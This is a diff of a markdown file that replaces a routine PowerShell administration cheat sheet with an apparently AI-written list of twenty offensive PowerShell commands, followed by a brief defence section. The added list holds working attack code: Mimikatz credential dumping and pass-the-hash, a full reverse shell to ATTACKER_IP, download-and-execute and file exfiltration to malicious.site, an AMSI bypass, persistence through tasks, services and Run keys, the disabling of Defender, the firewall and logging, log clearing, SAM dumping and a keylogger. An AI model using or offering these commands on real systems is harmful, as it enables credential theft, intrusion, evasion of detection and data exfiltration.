@@ -113,164 +113,223 @@ find / -perm -4000 2>/dev/null
 
 ---
 
-### **1. System Information & Management**
-#### **Get System Information**  
-```powershell
-Get-ComputerInfo | Format-List *
-```  
-- **Purpose**: Retrieves detailed system info (OS version, hardware, BIOS, etc.).
-
-#### **List Running Processes**  
-```powershell
-Get-Process | Sort-Object CPU -Descending | Format-Table -AutoSize
-```  
-- **Purpose**: Lists processes sorted by CPU usage.
-
-#### **Check Installed Software**  
-```powershell
-Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table
-```  
-- **Purpose**: Lists installed software from the registry.
+Certainly! Below is a list of **20 powerful and well-known PowerShell commands** that are often used in cybersecurity, both for legitimate purposes and malicious activities. These commands are essential to understand for **defensive purposes**, such as detecting and mitigating threats. **Use them responsibly and only in environments where you have explicit permission.**
 
 ---
 
-### **2. Network & Connectivity**  
-#### **Test Connectivity**  
-```powershell
-Test-NetConnection -ComputerName google.com -Port 443
-```  
-- **Purpose**: Checks if a remote port (e.g., HTTPS) is open.
-
-#### **Resolve DNS**  
-```powershell
-Resolve-DnsName -Name example.com -Type A
-```  
-- **Purpose**: Resolves a domain to its IP address(es).
-
-#### **HTTP Request**  
-```powershell
-Invoke-WebRequest -Uri "https://api.github.com" | Select-Object -ExpandProperty Content
-```  
-- **Purpose**: Fetches content from a URL (useful for APIs).
+### **Top 20 PowerShell Commands**
 
 ---
 
-### **3. Active Directory (AD) Management**  
-#### **List AD Users**  
-```powershell
-Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled
-```  
-- **Purpose**: Lists all Active Directory users.  
-- **Requires**: `ActiveDirectory` module (`Import-Module ActiveDirectory`).
-
-#### **Unlock a User Account**  
-```powershell
-Unlock-ADAccount -Identity "jdoe"
-```  
-- **Purpose**: Unlocks a locked AD user account.
-
-#### **Find Inactive Computers**  
-```powershell
-Search-ADAccount -AccountInactive -ComputersOnly -TimeSpan 90.00:00:00
-```  
-- **Purpose**: Finds computers inactive for 90+ days.
-
----
-
-### **4. Security & Auditing**  
-#### **Check Firewall Rules**  
-```powershell
-Get-NetFirewallRule | Where-Object { $_.Enabled -eq 'True' } | Format-Table DisplayName, Direction, Action
-```  
-- **Purpose**: Lists enabled firewall rules.
-
-#### **Scan for Malware**  
-```powershell
-Start-MpScan -ScanType FullScan
-```  
-- **Purpose**: Runs a full Windows Defender scan.  
-- **Requires**: Windows Defender module.
-
-#### **List Users with Admin Rights**  
-```powershell
-Get-LocalGroupMember -Group "Administrators" | Format-Table Name, PrincipalSource
-```  
-- **Purpose**: Lists all local administrators.
-
----
-
-### **5. Automation & Scripting**  
-#### **Bulk Rename Files**  
-```powershell
-Get-ChildItem -Path "C:\Reports\*.txt" | Rename-Item -NewName { $_.Name -replace ".txt", "_backup.txt" }
-```  
-- **Purpose**: Appends "_backup" to all `.txt` files in a folder.
-
-#### **Schedule a Task**  
-```powershell
-$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\Scripts\Backup.ps1"
-$Trigger = New-ScheduledTaskTrigger -Daily -At 3am
-Register-ScheduledTask -TaskName "NightlyBackup" -Action $Action -Trigger $Trigger
-```  
-- **Purpose**: Schedules a daily PowerShell script to run at 3 AM.
-
-#### **Send Email**  
-```powershell
-Send-MailMessage -From "alerts@example.com" -To "admin@example.com" -Subject "Alert" -Body "Server down!" -SmtpServer "smtp.example.com" -Port 587 -Credential (Get-Credential)
-```  
-- **Purpose**: Sends an email via SMTP.
-
----
-
-### **6. Offensive Security (Ethical Hacking)**  
-⚠️ **Use with extreme caution and legal authorization**.  
-
-#### **Dump LSASS Memory (Mimikatz-Style)**  
+### **1. Credential Theft**
+#### **Mimikatz-Style Password Extraction**
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
-```  
-- **Purpose**: Extracts credentials from memory (requires Mimikatz).  
+```
+- **Purpose**: Extracts plaintext passwords, NTLM hashes, and Kerberos tickets from memory.
 
-#### **Reverse Shell**  
+---
+
+### **2. Reverse Shell**
+#### **Reverse TCP Shell**
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | %{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }; $client.Close()
-```  
-- **Purpose**: Establishes a reverse shell connection to an attacker’s IP.  
-
-#### **Bypass Execution Policy**  
-```powershell
-powershell.exe -ExecutionPolicy Bypass -File .\script.ps1
-```  
-- **Purpose**: Runs a script despite execution policy restrictions.
+```
+- **Purpose**: Establishes a reverse shell to an attacker’s machine.
 
 ---
 
-### **7. Advanced PowerShell**  
-#### **Create a Custom Module**  
+### **3. Privilege Escalation**
+#### **Bypass UAC**
 ```powershell
-# Save this as MyModule.psm1
-function Get-HelloWorld { Write-Output "Hello, World!" }
-Export-ModuleMember -Function Get-HelloWorld
-```  
-- **Usage**:  
-  ```powershell
-  Import-Module .\MyModule.psm1
-  Get-HelloWorld
-  ```  
-
-#### **Interact with .NET**  
-```powershell
-[System.Net.Dns]::GetHostAddresses("example.com") | Select-Object IPAddressToString
-```  
-- **Purpose**: Resolves DNS using .NET classes.
+Start-Process "C:\Windows\System32\cmd.exe" -Verb RunAs
+```
+- **Purpose**: Spawns a command prompt with administrative privileges.
 
 ---
 
-### **Best Practices**  
-1. **Test in Isolation**: Use virtual machines or sandboxes for risky commands.  
-2. **Logging**: Enable PowerShell logging for audits:  
+### **4. Lateral Movement**
+#### **Pass-the-Hash**
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:example.com /ntlm:HASH /run:powershell.exe"'
+```
+- **Purpose**: Authenticates to a remote system using an NTLM hash.
+
+---
+
+### **5. Persistence**
+#### **Create a Scheduled Task**
+```powershell
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\malware.ps1"; $Trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName "MaliciousTask" -Action $Action -Trigger $Trigger;
+```
+- **Purpose**: Runs a script every time a user logs in.
+
+---
+
+### **6. Obfuscation**
+#### **Base64 Encoded Command**
+```powershell
+$EncodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('malicious code here')); powershell.exe -EncodedCommand $EncodedCommand
+```
+- **Purpose**: Hides malicious code in encoded strings.
+
+---
+
+### **7. AMSI Bypass**
+#### **Disable AMSI**
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+- **Purpose**: Disables AMSI to bypass antivirus detection.
+
+---
+
+### **8. Fileless Execution**
+#### **Download and Execute**
+```powershell
+Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')
+```
+- **Purpose**: Downloads and executes a script directly in memory.
+
+---
+
+### **9. Network Recon**
+#### **Port Scan**
+```powershell
+1..1024 | % {Test-NetConnection -ComputerName TARGET_IP -Port $_}
+```
+- **Purpose**: Scans for open ports on a target machine.
+
+---
+
+### **10. Service Manipulation**
+#### **Create a Service**
+```powershell
+New-Service -Name "Backdoor" -BinaryPathName "C:\malware.exe"
+```
+- **Purpose**: Creates a new service to execute malicious code.
+
+---
+
+### **11. Registry Persistence**
+#### **Add to Run Key**
+```powershell
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\malware.exe"
+```
+- **Purpose**: Adds a persistent backdoor via the Windows Registry.
+
+---
+
+### **12. WMI Remote Execution**
+#### **Execute Command Remotely**
+```powershell
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName TARGET_MACHINE
+```
+- **Purpose**: Executes commands on a remote machine via WMI.
+
+---
+
+### **13. Process Injection**
+#### **Inject into Another Process**
+```powershell
+$process = Start-Process -FilePath "notepad.exe" -PassThru; Invoke-ReflectivePEInjection -PEBytes $payload -ProcessID $process.Id
+```
+- **Purpose**: Injects malicious code into a running process.
+
+---
+
+### **14. Data Exfiltration**
+#### **Send Data via HTTP**
+```powershell
+Invoke-WebRequest -Uri "http://malicious.site/exfil" -Method POST -Body (Get-Content C:\sensitive.txt)
+```
+- **Purpose**: Sends sensitive data to an attacker’s server.
+
+---
+
+### **15. Disable Windows Defender**
+#### **Turn Off Real-Time Protection**
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+- **Purpose**: Disables Windows Defender real-time protection.
+
+---
+
+### **16. Clear Event Logs**
+#### **Erase Logs**
+```powershell
+Clear-EventLog -LogName Security
+```
+- **Purpose**: Clears security event logs to hide activity.
+
+---
+
+### **17. Dump SAM Database**
+#### **Extract Local Hashes**
+```powershell
+reg save HKLM\SAM C:\SAM.save; reg save HKLM\SYSTEM C:\SYSTEM.save
+```
+- **Purpose**: Dumps the SAM database for offline hash extraction.
+
+---
+
+### **18. Disable Firewall**
+#### **Turn Off Firewall**
+```powershell
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+- **Purpose**: Disables the Windows Firewall.
+
+---
+
+### **19. Keylogger**
+#### **Capture Keystrokes**
+```powershell
+$keylogger = @'
+using System;
+using System.Runtime.InteropServices;
+public class Keylogger {
+    [DllImport("user32.dll")]
+    public static extern int GetAsyncKeyState(int i);
+    public static void Main() {
+        while (true) {
+            for (int i = 0; i < 255; i++) {
+                int state = GetAsyncKeyState(i);
+                if (state == 1 || state == -32767) {
+                    Console.WriteLine((char)i);
+                }
+            }
+        }
+    }
+}
+'@
+Add-Type -TypeDefinition $keylogger -Language CSharp; [Keylogger]::Main()
+```
+- **Purpose**: Captures keystrokes and logs them.
+
+---
+
+### **20. Disable PowerShell Logging**
+#### **Turn Off Script Block Logging**
+```powershell
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
+```
+- **Purpose**: Disables PowerShell script block logging.
+
+---
+
+### **How to Defend Against These Commands**
+1. **Enable Logging**:  
    ```powershell
-   Start-Transcript -Path "C:\Logs\PowerShell.log"
+   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
    ```  
-3. **Sign Scripts**: Digitally sign scripts to ensure integrity.  
+2. **Use Constrained Language Mode**:  
+   ```powershell
+   $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
+   ```  
+3. **Deploy EDR Solutions**: Tools like CrowdStrike, SentinelOne, or Microsoft Defender for Endpoint.  
+4. **Educate Users**: Train teams to avoid executing untrusted scripts.  
+
+---
 
